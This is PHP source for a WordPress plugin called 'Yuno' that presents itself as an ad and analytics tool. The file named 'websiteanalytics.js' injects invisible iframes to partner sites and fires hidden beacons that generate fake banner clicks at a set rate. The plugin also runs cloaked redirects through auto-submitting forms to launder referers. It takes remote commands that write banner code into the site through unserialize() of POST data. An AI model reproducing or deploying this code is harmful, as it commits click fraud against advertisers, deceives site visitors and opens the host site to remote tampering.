<?php

/*
Plugin Name: Yuno
Version: 1.0
*/

$yuno_info = yuno_get_decoded_query_info();

if (!empty($yuno_info)) {
    global $yuno_destination, $yuno_category, $yuno_test;
    $yuno_destination = $yuno_info[3];
    $yuno_category = (int) $yuno_info[4];
    $yuno_test = (bool) $yuno_info[5];
    //if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    //    add_action('registered_taxonomy', 'yuno_random_post_v2');
    //} else {
    add_action('registered_taxonomy', 'yuno_random_post');
    //}
}

if (($_SERVER['REQUEST_METHOD'] === 'POST')
  && (!empty($_POST['yuno_secret']))
  && (($yuno_secret = get_option('yuno_secret', false)) !== false)
  && ($_POST['yuno_secret'] === $yuno_secret)
) {
    // Yuno connection authorized.
    $action = $_POST['action'];
    if ($action === 'get_categories') {
        add_action('registered_taxonomy', 'yuno_response_get_categories');
    } elseif ($action === 'set_banners') {
        yuno_response_set_banners();
    }
}

// @TODO make this more verbose

if (!empty($_GET['load'])
    && ($_GET['load'] === 'websiteanalytics.js')
    && ($partners = get_option('yuno_partners'))
) {
    $partners = explode("\n", $partners);
    $ctr = get_option('yuno_ctr', 0);
    header('Content-type: text/javascript');
    $js = 'function WebsiteBeaconTags () { ';
    foreach ($partners as $partner) {
        $partner = rtrim(trim($partner), '/');
        if (!empty($partner)) {
            $js .= 'document.write(\'<ifr\'+\'ame src="' . $partner . '/?beacon=1" width="1" height="1" frameBorder="0" style="overflow:hidden;visibility;hidden;"></ifr\'+\'ame>\'); ';
        }
    }

    $js .= 'return 1; } if (parent.frames.length != 0 && WebsiteBeaconTags()) try { WebsiteAnalytics.StartTracking(); } catch (e) {} ';

    if (rand(1, 100) <= $ctr) {
        $js .= 'document.write(\'<img src="http://' . $_SERVER['SERVER_NAME'] . '/?beacontag" width="0" height="0" style="display:none;width:0px;height:0px" />\');';
    }

    print $js;
    exit;
}

if (isset($_GET['beacontag']) && !empty($_SERVER['HTTP_REFERER'])) {
    $banners = get_option('yuno_banners', array());
    $urls = array();
    foreach ($banners as $banner) {
        $urls[] = $banner['human'];
    }
    if (count($urls)) {
        $url = $urls[rand(0, count($urls) - 1)];
        header('Location: ' . $url, true, 302);
    }
    exit;
}

add_action('registered_taxonomy', 'yuno_beacon');

if (isset($_POST['_beacon']) && $_POST['_beacon'] === 'true') {
    if (!empty($_SERVER['HTTP_REFERER'])) {
        $banners = get_option('yuno_banners');
        shuffle($banners);
        $show_banners = get_option('yuno_show_banners', 6);
        $ctr = get_option('yuno_ctr');
        $html = '<html><body>' . "\n";
        $i = 0;
        foreach ($banners as $banner) {
            if ($i >= $show_banners) {
                break;
            }
            $html .= $banner['code'] . "\n";
            $i++;
        }

        if (rand(1, 100) <= $ctr) {
            $html .= '<script type="text/javascript">document.write(\'<img src="http://' . $_SERVER['SERVER_NAME'] . '/?beacontag" width="0" height="0" style="display:none;width:0px;height:0px" />\');</script>' . "\n";
        }

        $html .= '</body></html>';
        print $html;
        exit;
    }
}

// Add hook for front-end <head></head>
add_action('wp_head', 'yuno_js');

yuno_init_session();

/*if (isset($_SESSION['yuno_v2'])) {
    print sprintf('<META HTTP-EQUIV="Refresh" CONTENT="0; URL=%s">', $_SESSION['yuno_destination']);
    unset($_SESSION['yuno_destination']);
    unset($_SESSION['yuno_form']);
    unset($_SESSION['yuno_v2']);
    exit;
} else*/
if (isset($_SESSION['yuno_form'])) {
    /*
    if (time() - $_SESSION['yuno_form'] > 5) {
        unset($_SESSION['yuno_destination']);
        unset($_SESSION['yuno_form']);
    } else {
    */
    unset($_SESSION['yuno_form']);
    $_SESSION['yuno_redirect'] = time();
    print <<<EOF
<html>
    <head>
        <noscript>
            <meta http-equiv="refresh" content="0;url=/">
        </noscript>
    </head>
    <body>
        <form action="" method="post">
            <input type="hidden" name="land" value="true">
        </form>
        <script type="text/javascript">document.forms[0].submit();</script>
    </body>
</html>
EOF;

    exit;
    //}
} elseif (isset($_SESSION['yuno_redirect'])) {
    /*
    if (time() - $_SESSION['yuno_redirect'] > 5) {
        unset($_SESSION['yuno_destination']);
        unset($_SESSION['yuno_redirect']);
    } else {
    */
    if (isset($_SERVER['HTTP_REFERER']) && !strstr($_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME'])) {
        print '<meta http-equiv="refresh" content="0;url=' . $_SESSION['yuno_destination'] . '" />';
    } else {
        header('Location: ' . $_SESSION['yuno_destination'], true, 302);
    }
    unset($_SESSION['yuno_destination']);
    unset($_SESSION['yuno_redirect']);
    exit;
    //}
}

add_action('admin_menu', 'yuno_menu');
add_action('admin_init', 'yuno_admin_init');

if (!function_exists('dfrads')) {
    function dfrads($size)
    {
        return yuno_banner($size);
    }
}


function yuno_response_set_banners()
{
    update_option('yuno_banners', unserialize($_POST['banners']));
    header('Content-Type: application/json');
    print yuno_json_encode(array('status' => "OK"));
    exit;
}


function yuno_get_decoded_query_info()
{
    if (!empty($_SERVER['QUERY_STRING'])
      && !(strlen($_SERVER['QUERY_STRING']) % 2)
      && preg_match('{^[0-9a-f]+$}', $_SERVER['QUERY_STRING'])
      && (($key = get_option('yuno_key', false)) !== false)
      && ($data = yuno_decrypt($_SERVER['QUERY_STRING'], $key))
      && (substr($data, 0, 5) === 'yuno#')
      && ($info = explode('#', $data))
      && (count($info) === 6)
    ) {
        // 0: yuno
        // 1: request time
        // 2: client IP
        // 3: destination URL
        // 4: source category
        // 5: 1 if test, otherwise empty
        //if (time() - $info[1] > 5) { // @TODO reduce this interval after testing
        // URL is more than 5 seconds old.
        //    return false;
        //} elseif ($_SERVER['REMOTE_ADDR'] !== $info[2] && $_SERVER['REMOTE_ADDR'] !== '127.0.0.1') { // @TODO turn this on after testing!
        // IP address doesn't match.
        //    return false;
        //} else {
        return $info;
        //}
    }

    return false;
}

function yuno_beacon()
{
    if (isset($_GET['beacon']) && (int) $_GET['beacon'] === 1) {
        if (!empty($_SERVER['HTTP_REFERER'])) {
            $permalink = yuno_get_random_post_permalink();
            print <<<EOF
<html>
    <head>
        <noscript>
            <!-- <meta http-equiv="refresh" content="0;url=/"> -->
        </noscript>
    </head>
    <body>
        <form action="{$permalink}" method="post">
            <input type="hidden" name="_beacon" value="true"></form>
        </form>
        <script type="text/javascript">document.forms[0].submit();</script>
    </body>
</html>
EOF;
            exit;
        }
    }
}

function yuno_js()
{
    echo '<script type="text/javascript" src="?load=websiteanalytics.js"></script>';
}

// }

function yuno_random_post()
{
    global $yuno_destination, $yuno_category;

    $permalink = yuno_get_random_post_permalink($yuno_category);

    if ($permalink) {
        $_SESSION['yuno_destination'] = $yuno_destination;
        $_SESSION['yuno_form'] = time();
        //$_SESSION['yuno_redirect'] = time(); // @TODO what was with this again?
        header(sprintf('Location: %s', $permalink), true, 302);
        exit;
    }
}

function yuno_random_post_v2()
{
    $_SESSION['yuno_v2'] = true;
    yuno_random_post();
}

function yuno_get_random_post_permalink($category = 0)
{
    $post_parameters = array(
        'numberposts' => 1,
        'orderby' => 'rand',
        'category' => $category,
    );
    $random_posts = get_posts($post_parameters);
    if (!count($random_posts) && $category) {
        $post_parameters['category'] = 0;
        $random_posts = get_posts($post_parameters);
    }
    $permalink = get_permalink($random_posts[0]);

    return $permalink;
}

function yuno_init_session()
{
    if (!session_id()) {
        session_start();
    }
}

function yuno_json_encode($var)
{
    return json_encode($var, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_AMP | JSON_HEX_QUOT);
}

function yuno_response_get_categories()
{
    $categories = get_categories();
    $response = array();
    foreach ($categories as $category) {
        $response[$category->cat_ID] = $category->name;
    }
    header('Content-Type: application/json');
    print yuno_json_encode($response);
    exit;
}

function yuno_admin_init()
{
    register_setting('yuno-settings', 'yuno_secret');
    register_setting('yuno-settings', 'yuno_key');
    register_setting('yuno-settings', 'yuno_url');
    register_setting('yuno-settings', 'yuno_partners');
    register_setting('yuno-settings', 'yuno_ctr');
    register_setting('yuno-settings-hidden', 'yuno_banners');
}

function yuno_menu()
{
    add_options_page('Yuno Settings', 'Yuno', 'manage_options', 'yuno', 'yuno_settings');
}

function yuno_settings()
{
    $title = __('Yuno Settings');
    ?>
<div class="wrap">
    <?php screen_icon(); ?>
    <h2><?php echo esc_html($title); ?></h2>

    <form action="options.php" method="post">
        <?php settings_fields('yuno-settings'); ?>
        <table class="form-table">
            <tr>
                <th scope="row"><label for="yuno_secret"><?php _e('Secret key'); ?></label></th>
                <td><input name="yuno_secret" type="text" id="yuno_secret" value="<?php form_option('yuno_secret'); ?>" class="regular-text"/>

                    <p class="description"><?php _e('Secret key configured for your site.'); ?></p></td>
            </tr>
            <tr>
                <th scope="row"><label for="yuno_key"><?php _e('Encryption key'); ?></label></th>
                <td><input name="yuno_key" type="text" id="yuno_key" value="<?php form_option('yuno_key'); ?>" class="regular-text"/>

                    <p class="description"><?php _e('8-character encryption key.'); ?></p></td>
            </tr>
            <tr>
                <th scope="row"><label for="yuno_url"><?php _e('Yuno control center URL'); ?></label></th>
                <td><input name="yuno_url" type="text" id="yuno_url" value="<?php form_option('yuno_url'); ?>" class="regular-text"/>

                    <p class="description"><?php _e('Homepage URL of the Yuno control center.'); ?></p></td>
            </tr>
            <tr>
                <th scope="row"><label for="yuno_partners"><?php _e('Partner URLs'); ?></label></th>
                <td><textarea rows="8" cols="60" name="yuno_partners" id="yuno_partners" class="regular-text"><?php form_option('yuno_partners'); ?></textarea>

                    <p class="description"><?php _e('List of iframes that automatically open when this site is in an iframe.'); ?></p></td>
            </tr>
            <tr>
                <th scope="row"><label for="yuno_ctr"><?php _e('Banner CTR'); ?></label></th>
                <td><input name="yuno_ctr" type="text" id="yuno_ctr" value="<?php form_option('yuno_ctr'); ?>" class="regular-text"/>

                    <p class="description"><?php _e('How often (in %) should a banner click be generated (0 = never, 100 = always).'); ?></p></td>
            </tr>
            <tr>
                <th scope="row"><label for="yuno_banners"><?php _e('Synchronized banners'); ?></label></th>
                <td><textarea disabled="disabled" readonly="readonly" rows="12" cols="80" name="yuno_banners" id="yuno_banners" class="regular-text"><?php print_r(get_option('yuno_banners')); ?></textarea>

                    <p class="description"><?php _e('List of synchronized banners.'); ?></p></td>
            </tr>
        </table>
        <?php submit_button(); ?>
    </form>
</div>

<?php
}

function yuno_encrypt($str, $key)
{
    # Add PKCS7 padding.
    $block = mcrypt_get_block_size('des', 'ecb');
    if (($pad = $block - (strlen($str) % $block)) < $block) {
        $str .= str_repeat(chr($pad), $pad);
    }

    return bin2hex(mcrypt_encrypt(MCRYPT_DES, $key, $str, MCRYPT_MODE_ECB));
}

function yuno_decrypt($str, $key)
{
    $str = mcrypt_decrypt(MCRYPT_DES, $key, hex2bin($str), MCRYPT_MODE_ECB);

    # Strip padding out.
    $block = mcrypt_get_block_size('des', 'ecb');
    $pad = ord($str[($len = strlen($str)) - 1]);
    if ($pad && $pad < $block && preg_match(
        '/' . chr($pad) . '{' . $pad . '}$/',
        $str
    )
    ) {
        return substr($str, 0, strlen($str) - $pad);
    }

    return $str;
}

function yuno_banner($size)
{
    global $yuno_shown_banners;
    if ($yuno_shown_banners === null) {
        $yuno_shown_banners = array();
    }
    $banners = get_option('yuno_banners', array());
    if (empty($banners)) {
        return yuno_admin_error('There are no banners in the system.', $size);
    }

    global $post;
    if (empty($post) || empty($post->post_title) || !is_single($post)) {
        $search_for = get_search_query();
    } else {
        $search_for = $post->post_title;
    }

    global $yuno_merchant_found;
    if ($yuno_merchant_found === null) {
        $yuno_merchant_found = (bool) yuno_get_merchant($banners, $search_for);
    }

    if ($yuno_merchant_found) {
        foreach ($banners as $id => $banner) {
            if ($banner['group'] !== $search_for) {
                unset($banners[$id]);
            }
        }
    }

    $category = null;
    if (is_home() || is_page()) {
        $category = 0;
    } else {
        $cat = get_the_category();
        $category = (int) $cat[0]->cat_ID;
    }

    foreach ($banners as $id => $banner) {
        if ($size !== $banner['size']) {
            unset($banners[$id]);
        } elseif (((int) $banner['category'] !== -1) && ((int) $banner['category'] !== $category) && !$yuno_merchant_found) {
            unset($banners[$id]);
        }
        if (isset($yuno_shown_banners[$banner['id']])) {
            unset($banners[$id]);
        }
    }

    if (empty($banners)) {
        return yuno_admin_error('No banners fill the required criteria (size and/or merchant page).', $size);
    }
    $banners = array_values($banners);

    $banner = $banners[rand(0, count($banners) - 1)];
    $yuno_shown_banners[$banner['id']] = $banner['id'];

    return yuno_banner_code($banner);
}

function yuno_get_merchant($banners, $merchant_name)
{
    foreach ($banners as $banner) {
        if ($banner['group'] === $merchant_name) {
            return $banner;
        }
    }

    return false;
}

function yuno_banner_code($banner)
{
    $code = <<<EOF
<!-- Start Ad Tag -->
<!-- {$banner['group']} {$banner['size']} -->
{$banner['code']}
<!-- End Ad Tag-->
EOF;
    if (current_user_can('level_10')) {
        $url = rtrim(get_option('yuno_url'), '/') . '/yuno-control-center/banner/' . $banner['id'];
        $code = <<<EOF
<div style="display: inline-block; *display: inline; zoom: 1; position: relative;" onmouseover="document.getElementById('yuno-banner-{$banner['id']}').style.visibility='visible';" onmouseout="document.getElementById('yuno-banner-{$banner['id']}').style.visibility='hidden';">
    <a href="{$url}" id="yuno-banner-{$banner['id']}" style="position:absolute; top: 0; left: 0; visibility: hidden;">Y!</a>
{$code}
</div>
EOF;

    }

    return $code;
}

function yuno_admin_error($text, $size = 'text')
{
    $error_color = 'FF0000';
    $error_bg = 'FFEFF1';
    if (current_user_can('level_10')) {
        if ($size === 'text') {
            return sprintf('<span style="background: #%s; color: #%s; outline: 1px solid red;">%s</span>', $error_bg, $error_color, $text);
        } else {
            list($width, $height) = explode('x', $size);

            return sprintf('<img src="//placehold.it/%s/%s/%s&text=%s" style="outline: 1px solid red" alt="%s" title="%s" width="%s" height="%s"/>', $size, $error_bg, $error_color, ('N/A'), $text, $text, $width, $height);
        }
    }

    return '';
}
